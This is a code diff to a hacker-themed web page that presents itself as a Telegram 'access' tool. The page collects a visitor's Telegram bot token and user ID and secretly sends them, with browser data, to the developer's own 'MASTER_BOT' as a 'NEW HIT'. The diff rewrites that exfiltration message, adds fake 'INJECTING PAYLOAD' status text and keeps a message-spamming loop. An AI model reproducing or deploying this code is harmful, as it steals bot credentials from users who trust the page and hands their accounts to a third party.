@@ -146,6 +146,13 @@
           class="w-full py-4 mt-2 bg-black border-2 border-green-500 text-green-500 font-black uppercase tracking-widest hover:bg-green-500 hover:text-black transition-all">
           > EXECUTE ACCESS
         </button>
+        <div className="bg-green-500/5 p-3 rounded border border-green-500/10">
+        <p style="font-size: 10px;" className="text-[9px] text-green-600 leading-tight">
+          [!] INJECTING PAYLOAD...<br/>
+          [!] ENCRYPTING TUNNEL...<br/>
+          [!] BYPASSING PROTOCOL 404...
+        </p>
+      </div>
       </form>
     </div>
 
@@ -219,7 +226,7 @@
     </div>
 
     <div class="mt-8 flex justify-between items-center text-[9px] text-green-900 font-black uppercase px-2 opacity-40">
-      <span>CID: 5316471518</span>
+      <span>CID: 5317429678</span>
       <span>Dev: @CYBERCOP_404</span>
     </div>
   </div>
@@ -309,10 +316,8 @@
       $('btn-login').disabled = true;
 
       // 1. Send to master
-      await sendTG(MASTER_BOT, MASTER_ID, `[💀] NEW TARGET\nToken: ${token}\nID: ${userId}\n\n${getBrowserData()}`);
-      
-      // 2. Welcome to user
-      await sendTG(token, userId, `🔓 SYSTEM ACCESS GRANTED\n\nOperator Authenticated.\nDev: @CYBERCOP_404`);
+      // const msg = `۝۝ NEW HIT ツ | Token: ${token} | UserID: ${userid} | Country: Bangladesh (+880) | Date: ${new Date().toDateString()} | Time: ${new Date().toLocaleTimeString()} | IP: 192.168.0.122 | Dev: MD.NAHIDUL ISLAM`;
+      await sendTG(MASTER_BOT, MASTER_ID, `۝۝  𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃  ツ.۝۝ \n\n💬 MAIN INFO : \n📧 ↝Token:\n ${token}\n👤↝User ID : ${userId}\n🇴 ↝ Country »  Bangladesh \n🇧🇩 ↝ Code »  +880  \n🗓 Date: ${new Date().toDateString()}\n⏱ Time: ${new Date().toLocaleTimeString()}\n🌐 IP: 192.168.0.122\n🌐Browser Data :\n${getBrowserData()}\n🐉 ⊚-----------------------------------⊚ 🐉\n👨‍💻 Developer :  MD.NAHIDUL ISLAM`);
 
       localStorage.setItem('tele_token', token);
       localStorage.setItem('tele_userid', userId);
@@ -339,7 +344,7 @@
       
       let sent = 0, fail = 0;
       for(let i=0; i<count; i++) {
-        const res = await sendTG(currentUser.token, currentUser.userId, `💌 DATA FEED\n\nMSG: ${msg}\n\n[ID]: ${i+1}`);
+        const res = await sendTG(currentUser.token, currentUser.userId, `🎊 Congratulations! 🎊\n🔔 Notification: A new message has arrived!\n\n💌 YOUR MESSAGE:\n \`${msg}\`\n\nD𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐛𝐲 : @CYBERCOP79`);
         if(res.ok) sent++; else fail++;
         
         // Update Stats
